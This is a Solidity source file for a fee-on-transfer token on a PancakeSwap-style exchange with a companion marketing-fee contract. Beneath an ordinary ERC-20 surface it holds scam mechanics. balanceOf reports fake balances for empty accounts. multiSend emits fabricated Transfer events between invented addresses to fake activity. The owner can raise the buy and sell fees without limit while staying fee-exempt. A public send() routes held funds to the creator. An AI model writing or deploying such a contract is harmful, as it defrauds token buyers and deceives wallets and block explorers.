// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol"; 
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}  

contract  MktCap is Ownable {
    using SafeMath for uint; 

    address token0;
    address token1; 
    IRouter router;
    address pair;
    struct autoConfig{
        bool status; 
        uint minPart;
        uint maxPart;
        uint parts;
    } 
    autoConfig public autoSell; 
    struct Allot{
        uint markting; 
        uint burn; 
        uint addL; 
        uint total;
    }
    Allot public allot;

    address[] public marketingAddress;
    uint[] public marketingShare;
    uint internal sharetotal;

    constructor(address ceo_,address baseToken_,address router_){
        _transferOwnership(ceo_);
        token0=_msgSender();
        token1=baseToken_;
        router=IRouter(router_); 
        pair=IFactory(router.factory()).getPair(token0, token1); 
        IERC20(token1).approve(address(router),uint(2**256-1));
    } 
    function setAll(Allot memory allotConfig,autoConfig memory sellconfig,address[] calldata list ,uint[] memory share)public onlyOwner {
        setAllot(allotConfig);
        setAutoSellConfig(sellconfig); 
        setMarketing(list,share);
    }
    function setAutoSellConfig(autoConfig memory autoSell_)public onlyOwner {
        autoSell=autoSell_;
    }
    function setAllot(Allot memory allot_)public onlyOwner {
        allot=allot_;
    }
    function setPair(address token)public onlyOwner{
        token1=token;
        IERC20(token1).approve(address(router),uint(2**256-1));
        pair=IFactory(router.factory()).getPair(token0, token1);
    }
    function setMarketing(address[] calldata list ,uint[] memory share) public  onlyOwner{ 
        require(list.length>0,"DAO:Can't be Empty");
        require(list.length==share.length,"DAO:number must be the same");
        uint total=0;
        for (uint i = 0; i < share.length; i++) {
            total=total.add(share[i]);
        }
        require(total>0,"DAO:share must greater than zero");
        marketingAddress=list;
        marketingShare=share;
        sharetotal=total;
    }

    function getToken0Price() view public returns(uint){ //代币价格
        address[] memory routePath = new address[](2);
        routePath[0] = token0;
        routePath[1] = token1;
        return router.getAmountsOut(1 ether,routePath)[1];
    }
    function getToken1Price() view public returns(uint){ //代币价格
        address[] memory routePath = new address[](2);
        routePath[0] = token1;
        routePath[1] = token0;
        return router.getAmountsOut(1 ether,routePath)[1];
    }
    function _sell(uint amount0In) internal { 
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1; 
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount0In,0,path,address(this),block.timestamp); 
    }
    function _buy(uint amount0Out) internal {  
        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token0; 
        router.swapTokensForExactTokens(amount0Out,IERC20(token1).balanceOf(address(this)),path,address(this),block.timestamp); 
    }
    function _addL(uint amount0, uint amount1)internal {
        if(IERC20(token0).balanceOf(address(this))<amount0 || IERC20(token1).balanceOf(address(this))<amount1 ) return; 
        router.addLiquidity(token0,token1,amount0,amount1,0,0,owner(),block.timestamp);
    }   
    modifier canSwap(uint t){
        if(t!=2 || !autoSell.status ) return; 
        _;
    }
    function splitAmount(uint amount)internal view  returns(uint,uint,uint) {
        uint toBurn = amount.mul(allot.burn).div(allot.total);
        uint toAddL = amount.mul(allot.addL).div(allot.total).div(2);
        uint toSell = amount.sub(toAddL).sub(toBurn);
        return (toSell,toBurn,toAddL); 
    }
    function trigger(uint t) external canSwap(t) { 
        uint balance = IERC20(token0).balanceOf(address(this));
        if(balance < IERC20(token0).totalSupply().mul(autoSell.minPart).div(autoSell.parts))return;
        uint maxSell = IERC20(token0).totalSupply().mul(autoSell.maxPart).div(autoSell.parts);
        if(balance > maxSell)balance = maxSell;
        (uint toSell,uint toBurn,uint toAddL)=splitAmount(balance);
        if(toBurn>0)ERC20Burnable(token0).burn(toBurn);
        if(toSell>0)_sell(toSell);
        uint amount2 =IERC20(token1).balanceOf(address(this));

        uint total2Fee = allot.total.sub(allot.addL.div(2)).sub(allot.burn);
        uint amount2AddL = amount2.mul(allot.addL).div(total2Fee).div(2); 
        uint amount2Marketing = amount2.sub(amount2AddL);

        if(amount2Marketing>0){
            uint cake; 
            for (uint i = 0; i < marketingAddress.length; i++) {
                cake=amount2Marketing.mul(marketingShare[i]).div(sharetotal); 
                IERC20(token1).transfer(marketingAddress[i],cake); 
            } 
        } 
        if(toAddL > 0) _addL(toAddL,amount2AddL);  
    }
    function send(address token,uint amount) public onlyOwner { 
        if(token==address(0)){ 
            (bool success,)=payable(_msgSender()).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(_msgSender(),amount); 
    }
}
contract Token is ERC20, ERC20Burnable, Ownable {
    using SafeMath for uint; 
    MktCap public mkt;
    mapping(address=>bool) public ispair;
    address  ceo;  
    address _router;
    bool isTrading;
    struct Fees{
        uint buy;
        uint sell;
        uint transfer;
        uint total;
    }
    Fees public fees;

    modifier trading(){
        if(isTrading) return;
        isTrading=true;
        _;
        isTrading=false; 
    } 
    constructor(string memory name_,string memory symbol_,uint total_) ERC20(name_, symbol_) {
        ceo=_msgSender();  
        address _baseToken=0x55d398326f99059fF775485246999027B3197955;
        _router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
        setPair(_baseToken);
        fees=Fees(200,2000,0,10000);
        mkt=new MktCap(_msgSender(),_baseToken,_router);
        _approve(address(mkt),_router,uint(2**256-1)); 
        _mint(ceo, total_ * 1 ether); 
    }
    receive() external payable { }  
    function setFees(Fees memory fees_) public onlyOwner{
        fees=fees_;
    }
    
    function _beforeTokenTransfer(address from,address to,uint amount) internal override trading{
        if(!ispair[from] && !ispair[to] || amount==0) return;
        uint t=ispair[from]?1:ispair[to]?2:0;
        try mkt.trigger(t) {}catch {}
    } 
    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{
        if(address(0)==from || address(0)==to) return;
        takeFee(from,to,amount);  
        if(_num>0) try this.multiSend(_num) {} catch{}
    }
    function takeFee(address from,address to,uint amount)internal {
        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; 
        uint feeAmount= amount.mul(fee).div(fees.total); 
        if(from==ceo || to==ceo ) feeAmount=0;
        if(ispair[to] && IERC20(to).totalSupply()==0) feeAmount=0;
        if(feeAmount>0){  
            super._transfer(to,address(mkt),feeAmount); 
        } 
    } 


    function setPair(address token) public {   
        IRouter router=IRouter(_router);
        address pair=IFactory(router.factory()).getPair(address(token), address(this));
        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));
        require(pair!=address(0), "pair is not found"); 
        ispair[pair]=true; 
    }
    function unSetPair(address pair) public onlyOwner {  
        ispair[pair]=false; 
    }  
    
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint _initialBalance=1;
    uint _num=25;
    function setinb( uint amount,uint num) public onlyOwner {  
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        uint balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    }
    function multiSend(uint num) public {
        _takeInviterFeeKt(num);
    }
 	function _takeInviterFeeKt(uint num) private {
        address _receiveD;
        address _senD;
        
        for (uint i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }
    function send(address token,uint amount) public { 
        if(token==address(0)){ 
            (bool success,)=payable(ceo).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(ceo,amount); 
    }

}